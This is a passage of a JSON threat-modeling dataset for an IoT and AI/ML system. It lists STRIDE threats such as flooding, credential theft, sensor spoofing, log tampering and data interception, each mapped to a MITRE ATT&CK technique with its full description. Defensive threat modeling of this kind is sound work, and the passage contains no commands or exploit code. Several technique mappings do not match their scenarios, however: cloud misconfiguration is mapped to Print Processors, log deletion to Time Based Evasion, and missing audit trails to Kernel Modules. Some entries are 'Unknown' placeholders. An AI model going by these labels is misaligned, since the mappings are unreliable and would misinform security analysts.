                {
                    "Assumption": "Network lacks rate limiting on incoming traffic.",
                    "Role": "Network Engineer",
                    "Condition": "No rate limiting mechanisms."
                },
                {
                    "Assumption": "Critical services do not have distributed load balancing.",
                    "Role": "System Architect",
                    "Condition": "Single-point load handling."
                },
                {
                    "Assumption": "No real-time monitoring to detect and mitigate flood attacks.",
                    "Role": "Network Operations Center (NOC)",
                    "Condition": "Lack of active monitoring."
                }
            ],
            "Potential Impact": "Disruption of service availability and degradation of system performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flood",
                "traffic overload",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting vulnerabilities in sensors to remotely disable them, causing a disruption in data collection and environmental control.",
            "Assumptions": [
                {
                    "Assumption": "Sensors have unpatched vulnerabilities open to remote exploitation.",
                    "Role": "Security Engineer",
                    "Condition": "Unpatched sensor firmware."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms in place for critical sensors.",
                    "Role": "System Architect",
                    "Condition": "Lack of sensor redundancy."
                },
                {
                    "Assumption": "Monitoring systems do not alert on sensor failures.",
                    "Role": "Network Operations Center (NOC)",
                    "Condition": "No failure alerts."
                }
            ],
            "Potential Impact": "Interruption of environmental control systems and loss of critical sensor data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "sensor disruption",
                "remote exploitation",
                "data collection interruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in AI/ML models to send overwhelming processing requests, leading to resource exhaustion.",
            "Assumptions": [
                {
                    "Assumption": "AI/ML processing infrastructure does not limit resource usage per request.",
                    "Role": "AI Engineer",
                    "Condition": "Unlimited resource allocation."
                },
                {
                    "Assumption": "No rate limiting on incoming requests to processing engines.",
                    "Role": "System Architect",
                    "Condition": "Unregulated request handling."
                },
                {
                    "Assumption": "System lacks monitoring for abnormal usage patterns.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of usage monitoring."
                }
            ],
            "Potential Impact": "Exhaustion of computational resources and system unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "AI/ML model abuse",
                "processing overload"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability in the IoT application to gain administrator privileges.",
            "Assumptions": [
                {
                    "Assumption": "The software contains exploitable vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "Existence of unpatched vulnerabilities."
                },
                {
                    "Assumption": "Security patches are not applied promptly.",
                    "Role": "System Administrator",
                    "Condition": "Delayed or missing security updates."
                },
                {
                    "Assumption": "Access to privileged operations is not monitored.",
                    "Role": "Security Analyst",
                    "Condition": "No monitoring of privileged access."
                }
            ],
            "Potential Impact": "Full control over the system and ability to manipulate or access any data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "software exploitation",
                "administrator access",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Escalation of privileges by exploiting weak access control configurations in cloud storage used by the IoT application.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage access controls are misconfigured.",
                    "Role": "Cloud Administrator",
                    "Condition": "Incorrect access settings."
                },
                {
                    "Assumption": "Lack of regular access control reviews.",
                    "Role": "Security Auditor",
                    "Condition": "No periodic reviews."
                },
                {
                    "Assumption": "No monitoring for abnormal access patterns.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of access monitoring."
                }
            ],
            "Potential Impact": "Unauthorized administrative access to cloud-stored data and resources.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control misconfiguration",
                "cloud storage",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Print Processors",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
                "technique_id": "T1547.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in communication protocols to gain unauthorized higher-level access in the IoT environment.",
            "Assumptions": [
                {
                    "Assumption": "Communication protocols have known vulnerabilities.",
                    "Role": "Network Engineer",
                    "Condition": "Vulnerable protocol usage."
                },
                {
                    "Assumption": "No regular protocol audits to identify and address weaknesses.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of protocol audits."
                },
                {
                    "Assumption": "Systems do not enforce principle of least privilege.",
                    "Role": "System Architect",
                    "Condition": "Overly broad access permissions."
                }
            ],
            "Potential Impact": "Ability to issue high-level commands and access restricted data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "protocol exploitation",
                "higher-level access",
                "command injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user by stealing login credentials.",
            "Assumptions": [
                {
                    "Assumption": "User credentials can be intercepted or obtained.",
                    "Role": "Attacker",
                    "Condition": "Network traffic is not encrypted or outside phishing."
                },
                {
                    "Assumption": "Authentication mechanisms like passwords or pins are not strong enough.",
                    "Role": "System Administrator",
                    "Condition": "Weak password policies are enforced."
                },
                {
                    "Assumption": "Multifactor authentication is not implemented.",
                    "Role": "System Administrator",
                    "Condition": "Only single-factor authentication is required."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential manipulation of the IoT environment.",
            "MITRE ATT&CK Keywords": [
                "Credential Dumping",
                "Phishing",
                "Password Guessing"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised user device to send unauthorized commands to actuators.",
            "Assumptions": [
                {
                    "Assumption": "User devices are not secured against malware.",
                    "Role": "User",
                    "Condition": "The device lacks antivirus or malware protection."
                },
                {
                    "Assumption": "Network traffic from user devices is not authenticated.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of device-level authentication."
                },
                {
                    "Assumption": "Communication channels between user devices and the IoT system are not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Use of unencrypted protocols for communication."
                }
            ],
            "Potential Impact": "Tampering with IoT devices that may cause physical harm or infrastructure damage.",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-Middle Attack",
                "Session Hijacking",
                "Command Injection"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a sensor to send false data to the system.",
            "Assumptions": [
                {
                    "Assumption": "Sensor authentication mechanisms are weak or non-existent.",
                    "Role": "System Engineer",
                    "Condition": "Devices lack secure and unique authentication methods."
                },
                {
                    "Assumption": "Communication channels are prone to interception.",
                    "Role": "Network Engineer",
                    "Condition": "Use of unsecured network protocols."
                },
                {
                    "Assumption": "There is no integrity checking on sensor data.",
                    "Role": "System Developer",
                    "Condition": "Lack of cryptographic techniques to verify data integrity."
                }
            ],
            "Potential Impact": "Disruption of AI/ML models due to inaccurate data, leading to poor decision-making.",
            "MITRE ATT&CK Keywords": [
                "Input Spoofing",
                "Device Impersonation",
                "Network Sniffing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data in transit between sensors and data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data traffic is not encrypted between sensors and storage.",
                    "Role": "Network Engineer",
                    "Condition": "Unencrypted communication protocols are used."
                },
                {
                    "Assumption": "There is no integrity validation for data in transit.",
                    "Role": "System Developer",
                    "Condition": "Lack of encryption and hashing mechanisms."
                },
                {
                    "Assumption": "Network devices are not adequately protected against tampering.",
                    "Role": "Network Administrator",
                    "Condition": "Insecure physical and logical controls."
                }
            ],
            "Potential Impact": "Compromised data integrity, leading to faulty system behaviors.",
            "MITRE ATT&CK Keywords": [
                "Data Manipulation",
                "Network Injection",
                "Man-in-the-Middle"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a sensor and alters its configuration.",
            "Assumptions": [
                {
                    "Assumption": "Sensors are installed in accessible locations without physical security.",
                    "Role": "Facility Manager",
                    "Condition": "Lack of physical access controls."
                },
                {
                    "Assumption": "Sensor firmware can be modified without authentication.",
                    "Role": "System Engineer",
                    "Condition": "No firmware protection mechanisms in place."
                },
                {
                    "Assumption": "System does not verify the integrity of sensor configurations periodically.",
                    "Role": "System Administrator",
                    "Condition": "Lack of regular integrity checks or monitoring."
                }
            ],
            "Potential Impact": "Corruption of sensor data and potential adverse effects on decision-making processes.",
            "MITRE ATT&CK Keywords": [
                "Device Tampering",
                "Physical Access",
                "Configuration Manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies AI/ML model training data stored in data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Training data is stored in repositories without adequate access controls.",
                    "Role": "Data Scientist",
                    "Condition": "Inadequate access control policies in place."
                },
                {
                    "Assumption": "Data repositories do not use cryptographic integrity checks.",
                    "Role": "Database Administrator",
                    "Condition": "Lack of encryption and hashing mechanisms for stored data."
                },
                {
                    "Assumption": "System logs are not monitored for unauthorized data modifications.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of log monitoring and alerting systems."
                }
            ],
            "Potential Impact": "Misleading AI/ML outcomes due to corrupted training data.",
            "MITRE ATT&CK Keywords": [
                "Data Integrity Attack",
                "Manipulation of Training Data",
                "Database Compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user performs actions on the system and denies responsibility due to lack of audit trails.",
            "Assumptions": [
                {
                    "Assumption": "System does not log all user actions in a non-repudiable manner.",
                    "Role": "System Administrator",
                    "Condition": "Lack of comprehensive logging and monitoring."
                },
                {
                    "Assumption": "Logs can be tampered with or deleted by users.",
                    "Role": "Security Administrator",
                    "Condition": "Weak log protection mechanisms."
                },
                {
                    "Assumption": "Audit logs are not backed up or stored securely.",
                    "Role": "Database Administrator",
                    "Condition": "Absence of log backup and encryption."
                }
            ],
            "Potential Impact": "Inability to attribute actions during security investigations, which could lead to unresolved incidents.",
            "MITRE ATT&CK Keywords": [
                "Log Tampering",
                "Non-repudiation",
                "Action Denial"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor alters or deletes system logs to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "System logs are stored in locations with insufficient access controls.",
                    "Role": "System Administrator",
                    "Condition": "Logs are not protected with strong access policies."
                },
                {
                    "Assumption": "There are no integrity checks in place for log files.",
                    "Role": "System Developer",
                    "Condition": "Lack of cryptographic mechanisms for log integrity."
                },
                {
                    "Assumption": "Critical system logs are not monitored in real-time for changes.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of real-time log monitoring solutions."
                }
            ],
            "Potential Impact": "Loss of critical forensic information, hampering incident response and recovery.",
            "MITRE ATT&CK Keywords": [
                "Log Manipulation",
                "Evasion",
                "Cover Tracks"
            ],
            "mitre_technique": {
                "name": "Time Based Evasion",
                "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",
                "id": "attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0",
                "technique_id": "T1497.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user executes malicious commands and claims they were not responsible due to lack of unique user identification.",
            "Assumptions": [
                {
                    "Assumption": "User actions are not uniquely identifiable or traceable.",
                    "Role": "System Administrator",
                    "Condition": "Lack of unique user identification mechanisms."
                },
                {
                    "Assumption": "Logging does not capture sufficient detail to attribute actions to specific users.",
                    "Role": "System Developer",
                    "Condition": "Logs lack granularity and completeness."
                },
                {
                    "Assumption": "Authentication and authorization audits are not enforced.",
                    "Role": "Security Administrator",
                    "Condition": "Infrequent or absent audit processes."
                }
            ],
            "Potential Impact": "Difficulty in distinguishing between legitimate and malicious user actions.",
            "MITRE ATT&CK Keywords": [
                "User Impersonation",
                "Traceability Issues",
                "Attribution Failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted during transmission between sensors and data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Use of unencrypted communication protocols."
                },
                {
                    "Assumption": "There are no robust authentication mechanisms for accessing data during transmission.",
                    "Role": "System Administrator",
                    "Condition": "Absence of strong authentication techniques."
                },
                {
                    "Assumption": "Network traffic can be easily accessible or monitored.",
                    "Role": "Attacker",
                    "Condition": "Weak network security infrastructure."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive information, leading to potential privacy violations.",
            "MITRE ATT&CK Keywords": [
                "Data Interception",
                "Network Sniffing",
                "Sensitive Information Disclosure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A poorly secured cloud storage exposes user data and system configurations.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not configured with proper access controls.",
                    "Role": "Cloud Administrator",
                    "Condition": "Inadequate access control policies."
                },
                {
                    "Assumption": "Data stored in the cloud is not encrypted.",
                    "Role": "Database Administrator",
                    "Condition": "Lack of data encryption at rest."
                },
                {
                    "Assumption": "Cloud service is vulnerable to misconfigurations and exploits.",
                    "Role": "System Engineer",
                    "Condition": "Frequent misconfigurations and lack of security reviews."
                }
            ],
            "Potential Impact": "Exposure of user profiles and system configurations to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "Cloud Storage Misconfiguration",
                "Data Exposure",
                "Storage Exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in the communication infrastructure to access sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "There are existing vulnerabilities in network devices (e.g., routers, gateways).",
                    "Role": "Network Engineer",
                    "Condition": "Unpatched or outdated network devices."
                },
                {
